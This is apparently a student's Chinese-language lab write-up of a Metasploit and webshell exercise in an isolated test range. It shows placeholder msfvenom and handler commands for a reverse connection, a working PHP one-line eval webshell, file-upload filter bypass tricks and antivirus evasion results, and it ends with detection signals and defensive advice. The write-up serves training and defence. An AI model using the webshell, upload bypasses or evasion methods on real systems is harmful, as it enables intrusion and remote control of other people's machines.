> 实验环境：VMware 内网靶场两台（Kali 攻击机 + Windows 10 靶机），全程离线隔离。本文仅讨论原理与检测对抗，不提供可用载荷参数。

## 一、实验目的

1. 理解 Metasploit 载荷生成与监听的基本流程
2. 观察 msfvenom 默认载荷在主流杀软下的检出情况
3. 通过 Webshell 建立会话，理解「控制通道」的本质

## 二、基本流程

正常实验链路是固定的三段：

```text
生成载荷 → 监听 → 目标执行 → 回连 → 会话控制
```

对应的核心命令结构（参数已隐去）：

```bash
# 1. 生成载荷（参数：平台/架构/输出格式/回连地址端口）
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe -o demo.exe

# 2. 启动监听
msfconsole -q
use exploit/multi/handler
set payload <payload>
set LHOST <ip>
set LPORT <port>
run
```

第一次跑，Windows Defender **开机即拦**，文件刚落地就被隔离，`handler` 那边毫无反应。

## 三、检出情况记录

用同一个载荷做不同处理，在实验机上逐一测试：

| 处理方式 | Defender | 360 | 火绒 | 说明 |
| --- | --- | --- | --- | --- |
| 原始 exe | 拦截 | 拦截 | 拦截 | 特征匹配直接命中 |
| 加壳（UPX） | 拦截 | 拦截 | 拦截 | 壳本身也是特征 |
| 改特征码 + 分离加载 | 偶发 | 拦截 | 偶发 | 静态过了，运行行为被抓 |
| 白加黑 DLL 劫持 | 未拦 | 拦截 | 未拦 | 依赖合法进程，行为仍可疑 |

结论很清楚：**静态免杀只能躲一时，行为检测才是终点**。

## 四、Webshell 部分

靶机上先起一个 Web 服务（课程提供的是上传点已打好），上传一句话木马后用蚁剑连接。

一句话木马的本质是一次可控的代码执行：

```php
<?php @eval($_POST['pass']); ?>
```

蚁剑连接时需要填 URL 和连接密码，连上之后能看到文件管理、虚拟终端、数据库管理几个面板。

绕过上传检测常见的几种思路（仅原理）：

- 改 Content-Type 为 `image/jpeg`
- 双写后缀（`shell.php.jpg` / `shell.pHp`）
- 利用解析漏洞（`shell.php.` / `shell.php%00.jpg`）
- 图片马 + 文件包含

这些在 Pikachu 的「文件上传」和「文件包含」两关都能复现，思路一模一样。

## 五、检测侧是怎么抓到的

实验里翻了下日志，发现三类信号特别显眼：

1. **进程行为**：`powershell.exe` 被 `winword.exe` 之类启动，父子进程关系异常
2. **网络行为**：固定心跳周期、固定外连端口、无域名解析的裸 IP 连接
3. **文件行为**：短时间内写入系统目录、注册自启动项

换句话说，**攻击链上每一步都会留痕**，免杀只是把检测点往后推。

## 六、结论与防御建议

| 层面 | 措施 |
| --- | --- |
| 终端 | 开启 EDR 行为监控，别只依赖特征库 |
| 网络 | 出向流量白名单，阻断裸 IP 外连 |
| Web | 上传目录禁止执行，文件类型白名单校验 |
| 账号 | 最小权限运行，Web 服务不用管理员账号 |
| 运维 | 定期查自启动项与计划任务 |

这次实验最大的收获不是「怎么过杀软」，而是**知道防守方会从哪里看到你**。反过来做防御，思路也清楚了。
